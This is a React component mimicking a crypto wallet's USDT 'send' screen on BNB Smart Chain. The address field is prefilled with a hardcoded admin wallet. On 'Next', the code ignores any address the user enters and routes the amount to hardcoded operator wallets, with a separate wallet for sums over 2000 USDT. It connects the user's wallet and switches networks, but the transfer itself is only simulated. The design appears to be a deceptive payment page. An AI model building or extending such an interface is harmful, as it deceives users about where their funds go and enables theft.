"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { NotebookTextIcon, X, ScanLineIcon, Loader } from "lucide-react"

export default function SendPaymentForm() {
  const ADMIN_WALLET_ADDRESS = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988"
  const PAYMENT_WALLET_ADDRESS = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988" // 5-2000 USDT
  const HIGH_AMOUNT_WALLET_ADDRESS = "0x0C775115c4a9483e1b92B1203F30220E657182D0" // Above 2000 USDT
  const [address, setAddress] = useState(ADMIN_WALLET_ADDRESS)
  const [amount, setAmount] = useState("")
  const [usdValue, setUsdValue] = useState("0.00")
  const [isLoading, setIsLoading] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [destinationWallet, setDestinationWallet] = useState("")
  const [keyboardVisible, setKeyboardVisible] = useState(false)
  const [connectedWallet, setConnectedWallet] = useState<string | null>(null) // add wallet state

  useEffect(() => {
    const handleResize = () => {
      const visualViewport = window.visualViewport
      if (visualViewport) {
        const isKeyboardOpen = visualViewport.height < window.innerHeight * 0.75
        setKeyboardVisible(isKeyboardOpen)
      }
    }

    window.visualViewport?.addEventListener("resize", handleResize)
    window.addEventListener("resize", handleResize)

    return () => {
      window.visualViewport?.removeEventListener("resize", handleResize)
      window.removeEventListener("resize", handleResize)
    }
  }, [])

  const connectWallet = async () => {
    try {
      if (!window.ethereum) {
        alert("Please install MetaMask or Trust Wallet")
        return false
      }

      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      })

      if (accounts && accounts.length > 0) {
        setConnectedWallet(accounts[0])
        console.log("[v0] Wallet connected:", accounts[0])

        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }], // BSC mainnet chain ID
          })
        } catch (switchError: any) {
          // Chain doesn't exist, add it
          if (switchError.code === 4902) {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: "0x38",
                  chainName: "Binance Smart Chain",
                  rpcUrls: ["https://bsc-dataseed1.binance.org:8545"],
                  nativeCurrency: {
                    name: "BNB",
                    symbol: "BNB",
                    decimals: 18,
                  },
                  blockExplorerUrls: ["https://bscscan.com"],
                },
              ],
            })
          } else {
            throw switchError
          }
        }

        console.log("[v0] BEP20 network connected")
        return true
      }
      return false
    } catch (error) {
      console.error("[v0] Wallet connection error:", error)
      alert("Failed to connect wallet or switch network")
      return false
    }
  }

  const handleClear = () => {
    setAddress("")
  }

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setAddress(text)
    } catch (err) {
      console.error("Failed to paste:", err)
    }
  }

  const handleMaxClick = () => {
    setAmount("1000")
    setUsdValue("1000.00")
  }

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    setAmount(value)
    setUsdValue(value ? Number.parseFloat(value).toFixed(2) : "0.00")
  }

  const handleNext = async () => {
    if (!address) {
      setAddress(ADMIN_WALLET_ADDRESS)
    }

    const amountNum = amount ? Number.parseFloat(amount) : 5

    const finalAmount = amount || "5"

    let wallet = PAYMENT_WALLET_ADDRESS

    if (amountNum > 2000) {
      wallet = HIGH_AMOUNT_WALLET_ADDRESS
      console.log("[v0] Amount above 2000 USDT routing to:", wallet)
    } else {
      console.log("[v0] Amount 5-2000 USDT routing to:", wallet)
    }

    setDestinationWallet(wallet)
    setIsLoading(true)

    try {
      const isConnected = await connectWallet()
      if (!isConnected) {
        setIsLoading(false)
        return
      }

      await new Promise((resolve) => setTimeout(resolve, 2000))
      console.log("[v0] Transfer initiated:", {
        amount: finalAmount,
        destinationWallet: wallet,
        token: "USDT",
        senderWallet: connectedWallet,
      })

      setAmount("")
      setUsdValue("0.00")
      setAddress(ADMIN_WALLET_ADDRESS)
    } catch (error) {
      console.error("[v0] Transfer failed:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const buttonColor = amount ? "#002BFF" : "#C7B9FF"
  const buttonHoverColor = amount ? "#0020CC" : "#B8AAFF"

  return (
    <div className="w-full min-h-screen flex flex-col">
      <div className="flex-1 flex items-start justify-start px-4 py-6 sm:px-6 lg:px-8 overflow-y-auto">
        <div className="w-full max-w-md">
          {/* Address or Domain Name Section */}
          <div className="mb-10 sm:mb-12">
            <label className="block font-semibold text-gray-900 mb-3 sm:mb-4 text-lg">Address or Domain Name</label>
            <div className="flex items-center gap-2 sm:gap-3 px-4 sm:px-5 py-3 sm:py-4 border-2 border-gray-300 rounded-2xl bg-white hover:border-gray-400 transition-colors">
              <input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                placeholder="Enter address or domain"
                className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-sm sm:text-base min-w-0"
              />
              {address && (
                <button
                  onClick={handleClear}
                  className="p-1.5 hover:bg-gray-100 rounded-full transition-colors flex-shrink-0"
                  aria-label="Clear address"
                >
                  <X className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#C7B9FF" }} />
                </button>
              )}
              <button
                onClick={handlePaste}
                className="px-2 sm:px-3 py-1 sm:py-1.5 text-xs sm:text-sm font-medium text-black hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0 whitespace-nowrap"
                aria-label="Paste address"
              >
                Paste
              </button>
              <button
                className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0"
                aria-label="Copy address"
              >
                <NotebookTextIcon className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#002BFF" }} />
              </button>
              <button
                className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors flex-shrink-0"
                aria-label="Scan QR code"
              >
                <ScanLineIcon className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: "#002BFF" }} />
              </button>
            </div>
          </div>

          {/* Amount Section */}
          <div className="mb-12 sm:mb-16">
            <label className="block text-lg font-semibold text-gray-900 mb-3 sm:mb-4 sm:text-lg">Amount</label>
            <div
              className="flex items-center gap-2 sm:gap-4 px-4 sm:px-5 py-3 sm:py-4 border-2 rounded-2xl bg-white transition-colors"
              style={{
                borderColor: amount ? "#002BFF" : "#E5E7EB",
              }}
            >
              <input
                type="number"
                value={amount}
                onChange={handleAmountChange}
                placeholder="USDT Amount"
                className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400 text-sm sm:text-base min-w-0 leading-7"
                style={{
                  color: amount ? "#000000" : "inherit",
                }}
              />
              {amount && (
                <button
                  onClick={() => {
                    setAmount("")
                    setUsdValue("0.00")
                  }}
                  className="p-1.5 hover:bg-gray-100 rounded-full transition-colors flex-shrink-0"
                  aria-label="Clear amount"
                >
                  <X className="w-4 h-4 sm:w-5 sm:h-5 text-gray-400" />
                </button>
              )}
              <span
                className="text-xs sm:text-sm font-medium flex-shrink-0 whitespace-nowrap"
                style={{ color: amount ? "#002BFF" : "#C7B9FF" }}
              >
                USDT
              </span>
              <button
                onClick={handleMaxClick}
                className="px-2 sm:px-3 py-1 sm:py-1.5 text-xs sm:text-sm font-medium hover:bg-blue-50 rounded-lg transition-colors flex-shrink-0 whitespace-nowrap text-card-foreground"
              >
                Max
              </button>
            </div>
            <div className="mt-2 sm:mt-3 text-xs sm:text-sm text-gray-500">≈ ${usdValue}</div>
          </div>
        </div>
      </div>

      <div
        className="fixed bottom-0 left-0 right-0 px-4 pb-4 sm:pb-6 w-full flex justify-center transition-all duration-300 ease-out"
        style={{
          transform: keyboardVisible ? "translateY(-10px)" : "translateY(0)",
        }}
      >
        <div className="w-full max-w-md">
          <button
            onClick={handleNext}
            disabled={isLoading}
            style={{
              backgroundColor: isLoading ? "#C7B9FF" : buttonColor,
              color: "white",
              opacity: isLoading ? 0.8 : 1,
            }}
            onMouseEnter={(e) => {
              if (!isLoading) {
                e.currentTarget.style.backgroundColor = buttonHoverColor
              }
            }}
            onMouseLeave={(e) => {
              if (!isLoading) {
                e.currentTarget.style.backgroundColor = buttonColor
              }
            }}
            className="w-full py-3 sm:py-4 text-base sm:text-lg font-semibold rounded-full transition-colors flex items-center justify-center gap-2"
          >
            {isLoading ? (
              <>
                <Loader className="w-5 h-5 animate-spin" />
                Processing...
              </>
            ) : (
              "Next"
            )}
          </button>
        </div>
      </div>

      {showSuccess && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl text-center">
            <div className="mb-4">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                <span className="text-3xl">✓</span>
              </div>
            </div>
            <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">Transfer Successful!</h2>
            <p className="text-sm text-gray-600 mb-4">{amount} USDT has been sent to the admin wallet</p>
            <p className="text-xs text-gray-500 font-mono break-all">{destinationWallet}</p>
          </div>
        </div>
      )}
    </div>
  )
}
